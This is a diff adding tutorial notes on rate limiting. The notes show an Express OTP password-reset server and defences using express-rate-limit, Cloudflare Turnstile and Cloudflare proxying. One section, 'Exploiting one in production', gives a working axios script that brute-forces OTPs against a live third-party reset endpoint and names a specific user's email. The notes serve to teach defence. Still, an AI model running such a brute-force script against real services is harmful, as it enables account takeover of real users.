@@ -1,0 +1,393 @@
+Why rate limitting ?
+ 
+- Preventing Overload: Rate limiting controls how often a user or system can make requests to a service. This helps prevent overuse of resources, ensuring that the system remains available and responsive for all users. For example, rate limiting can stop a single user from making thousands of login attempts in a minute, which could otherwise degrade service for others.
+
+- Mitigating Abuse: Without rate limiting, an application could be more susceptible to abuse such as brute force attacks on passwords or spamming behavior. By limiting how often someone can perform an action, it reduces the feasibility of such attacks.
+
+- Managing Traffic: In high-traffic scenarios, like ticket sales for a popular event, rate limiting can help manage the load on a server, preventing crashes and ensuring a fairer distribution of service like bandwidth or access to the purchasing system.
+
+- DDoS Protection: A DDoS attack involves overwhelming a site with a flood of traffic from multiple sources, which can make the website unavailable. DDoS protection mechanisms detect unusual traffic flows and can filter out malicious traffic, helping to keep the service operational despite the attack.
+
+-----
+
+Common place to add rate limits =>
+
+Ref - https://thehackernews.com/2016/03/hack-facebook-account.html
+ 
+When you allow a user to reset their password using an OTP from their email, the following endpoint should be rate limited heavily
+
+-----
+
+Rate Limiting can be done on API Gateways Level / Load Balancer / IP Level / User Level / Application Level.
+
+As our app grows, we should rate limit the number of requests to our services, so that the server can't be exploited.
+
+We have to aggressively limit the reset password endpoint, otherwise the hacker can exploit it by bombarding the server with a series of requests and be able to reset the password as the OTPs are generally 6-digit / 4-digit numeric ones. (By running a loop and hitting the backend if it is not rate limited)
+
+----
+```
+import express from 'express';
+
+const app = express();
+const PORT = 3000;
+
+app.use(express.json());
+
+// Store OTPs in a simple in-memory object
+const otpStore: Record<string, string> = {};
+
+// Endpoint to generate and log OTP
+app.post('/generate-otp', (req, res) => {
+  const email = req.body.email;
+  if (!email) {
+    return res.status(400).json({ message: "Email is required" });
+  }
+  const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
+  otpStore[email] = otp;
+
+  console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
+  res.status(200).json({ message: "OTP generated and logged" });
+});
+
+// Endpoint to reset password
+app.post('/reset-password', (req, res) => {
+  const { email, otp, newPassword } = req.body;
+  if (!email || !otp || !newPassword) {
+    return res.status(400).json({ message: "Email, OTP, and new password are required" });
+  }
+  if (otpStore[email] === otp) {
+    console.log(`Password for ${email} has been reset to: ${newPassword}`);
+    delete otpStore[email]; // Clear the OTP after use
+    res.status(200).json({ message: "Password has been reset successfully" });
+  } else {
+    res.status(401).json({ message: "Invalid OTP" });
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
+});
+```
+Hitting it via postman
+Try hitting it with various OTPs one by one. Notice the server doesn’t rate limit you
+
+--------------
+
+Exploiting one in production
+
+Try resetting password on https://harkirat.classx.co.in
+
+Go to the website
+Put in a random users email
+Send OTP
+Try putting a random OTP
+
+Exploiting it
+Copy over the request from the network tab as curl
+Paste it in Postman(import)
+
+Send a request via postman
+Export the request
+
+Update the script to brute force on this endpoint
+
+import axios from "axios";
+
+async function sendRequest(otp: number) {
+  let config = {
+    method: 'get',
+    maxBodyLength: Infinity,
+    url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=' + otp,
+    headers: { 
+      'accept': '*/*', 
+      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
+      'auth-key': 'appxapi', 
+      'client-service': 'Appx', 
+      'device-type': '', 
+      'origin': 'https://harkirat.classx.co.in', 
+      'priority': 'u=1, i', 
+      'referer': 'https://harkirat.classx.co.in/', 
+      'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', 
+      'sec-ch-ua-mobile': '?0', 
+      'sec-ch-ua-platform': '"macOS"', 
+      'sec-fetch-dest': 'empty', 
+      'sec-fetch-mode': 'cors', 
+      'sec-fetch-site': 'same-site', 
+      'source': 'website', 
+      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+    }
+  };
+
+  try {
+    await axios.request(config);
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+async function main() {
+  for (let i = 0; i < 1000000; i+=100) {
+    const promises = [];
+    console.log("here for " + i);
+    for (let j = 0; j < 100; j++) {
+      promises.push(sendRequest(i + j))
+    }
+    await Promise.all(promises);
+  }
+}
+
+main()
+
+You’ll get rate limited
+
+------
+
+Saving the endpoint =>
+
+Ref https://www.npmjs.com/package/express-rate-limit
+
+Update the code
+Add dependency
+npm i express-rate-limit
+
+import express from 'express';
+import rateLimit from 'express-rate-limit';
+
+const app = express();
+const PORT = 3000;
+
+app.use(express.json());
+
+// Rate limiter configuration
+const otpLimiter = rateLimit({
+    windowMs: 5 * 60 * 1000, // 5 minutes
+    max: 3, // Limit each IP to 3 OTP requests per windowMs
+    message: 'Too many requests, please try again after 5 minutes',
+    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
+    legacyHeaders: false, // Disable the `X-RateLimit-*` headers
+});
+
+const passwordResetLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 5, // Limit each IP to 5 password reset requests per windowMs
+    message: 'Too many password reset attempts, please try again after 15 minutes',
+    standardHeaders: true,
+    legacyHeaders: false,
+});
+
+// Store OTPs in a simple in-memory object
+const otpStore: Record<string, string> = {};
+
+// Endpoint to generate and log OTP with rate limiting
+app.post('/generate-otp', otpLimiter, (req, res) => {
+    console.log(req.body);
+    const email = req.body.email;
+    if (!email) {
+        return res.status(400).json({ message: "Email is required" });
+    }
+    const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
+    otpStore[email] = otp;
+
+    console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
+    res.status(200).json({ message: "OTP generated and logged" });
+});
+
+// Endpoint to reset password with rate limiting
+app.post('/reset-password', passwordResetLimiter, (req, res) => {
+    const { email, otp, newPassword } = req.body;
+
+    if (!email || !otp || !newPassword) {
+        return res.status(400).json({ message: "Email, OTP, and new password are required" });
+    }
+    if (Number(otpStore[email]) === Number(otp)) {
+        console.log(`Password for ${email} has been reset to: ${newPassword}`);
+        delete otpStore[email]; // Clear the OTP after use
+        res.status(200).json({ message: "Password has been reset successfully" });
+    } else {
+        res.status(401).json({ message: "Invalid OTP" });
+    }
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
+});
+
+app.use(rateLimitLogic); // apply to all endpoints
+
+------
+
+Problem?
+Your server is still vulnerable to DDoS
+
+Distributed Denial of Service => server is attacked from different IPs all over the world to choke your server and make it unusable. Bombard the server with overwhelming requests so that the server gets unusable. In this case as the requests are coming from different IPs, we can't really rate limit everyone of them.
+
+
+Though DDoS is rarely used for password reset, it is usually used to choke a server.
+ 
+Why do attackers to DDoS - 
+    - To charge ransom because the service remains down until DDoS is lifted
+    - On sneaker drop events/NFT mints where the faster the request reaches the server the better
+ 
+How can you save your reset password endpoint?
+    - You can implement logic that only 3 resets are allowed per email sent out
+    - You can implement captcha logic
+
+-------
+
+Captchas
+    Captchas are a great-sh solution to making sure the request was sent by a human and not by a machine
+    There are various freely available captchas, Cloudflare Turnstile is one of them
+
+Adding captchas via cloudflare =>
+    - Add a new site to turnstile
+    - Keep your site key and site secret safe
+    - Create a react project
+    - Add https://github.com/marsidev/react-turnstile
+    - Update App.tsx
+
+````
+
+import { Turnstile } from '@marsidev/react-turnstile'
+
+import './App.css'
+import axios from 'axios'
+import { useState } from 'react'
+
+function App() {
+  const [token, setToken] = useState<string>("")
+
+  return (
+    <>
+      <input placeholder='OTP'></input>
+      <input placeholder='New password'></input>
+
+      <Turnstile onSuccess={(token) => {
+        setToken(token)
+      }} siteKey='0x4AAAAAAAXtEe2JIeAEUcjX' />
+
+      <button onClick={() => {
+        axios.post("http://localhost:3000/reset-password", {
+          email: "harkirat@gmail.com",
+          otp: "123456",
+          token: token,
+        })
+      }}>Update password</button>
+    </>
+  )
+}
+
+export default App
+
+````
+````
+Update the backend code
+
+import express from 'express';
+import cors from "cors";
+
+const SECRET_KEY = "your_site_secret";
+
+const app = express();
+const PORT = 3000;
+
+app.use(express.json());
+app.use(cors());
+
+// Store OTPs in a simple in-memory object
+const otpStore: Record<string, string> = {};
+
+// Endpoint to generate and log OTP
+app.post('/generate-otp', (req, res) => {
+  console.log(req.body)
+  const email = req.body.email;
+  if (!email) {
+    return res.status(400).json({ message: "Email is required" });
+  }
+  const otp = Math.floor(100000 + Math.random() * 900000).toString(); // generates a 6-digit OTP
+  otpStore[email] = otp;
+
+  console.log(`OTP for ${email}: ${otp}`); // Log the OTP to the console
+  res.status(200).json({ message: "OTP generated and logged" });
+});
+
+// Endpoint to reset password
+app.post('/reset-password', async (req, res) => {
+  const { email, otp, newPassword, token } = req.body;
+  console.log(token); // valid for very small time and only can be sent once.
+
+  let formData = new FormData();
+	formData.append('secret', SECRET_KEY);
+	formData.append('response', token);
+
+  const url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
+	const result = await fetch(url, {
+		body: formData,
+		method: 'POST',
+	});
+  const challengeSucceeded = (await result.json()).success;
+
+  if (!challengeSucceeded) {
+    return res.status(403).json({ message: "Invalid reCAPTCHA token" });
+  }
+
+  if (!email || !otp || !newPassword) {
+    return res.status(400).json({ message: "Email, OTP, and new password are required" });
+  }
+  if (Number(otpStore[email]) === Number(otp)) {
+    console.log(`Password for ${email} has been reset to: ${newPassword}`);
+    delete otpStore[email]; // Clear the OTP after use
+    res.status(200).json({ message: "Password has been reset successfully" });
+  } else {
+    res.status(401).json({ message: "Invalid OTP" });
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
+});
+
+
+````
+
+DDoS protection in prod =>
+    - Move your domain to cloudflare
+    - Proxy all records via cloudflare (whenever we hit the website it will reach cloudflare first and after cloudflare make sure that it is not an attack then it will redirect the request to your website else it will stop the user from hitting the website)
+
+This is usually more than good enough, but if you’d like to dive further, you can add IP based rate limits, override DDoS in the security section of cloudflare
+AWS/GCP also provide you with the same
+
+Cloudflare provides us DDoS protection (specifically for attacks from bot farm) and WAFs (rate limiting and rules to handle traffic) instead of doing it in application level we can do this using cloudflare proxy.
+
+captcha tries to ensure that the request is coming from a human, not a bot or some malicious program by giving you some challenges to solve. It determines the legitimacy of the request after it reaches your application. Captchas are very difficult to be solved by any program logic.
+
+------------
+
+Captchas using cloudflare turnstile =>
+  - Add a site name
+  - enter website's hostname or select from existing websites on cloudflare
+  - after creating a widget, it will give us a Site Key and Secret Key for future reference.
+
+So on our website when a user solves a challenge (basically talking to a cloudflare worker), after successful completion of the challenge, cloudflare gives a token and attach that token while redirecting our request to the backend, then on our backend we verify with cloudflare if this token is generated by cloudflare after solving a challenge or not. Then only we get a response from the backend for our request.
+
+captchas run on the browser.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
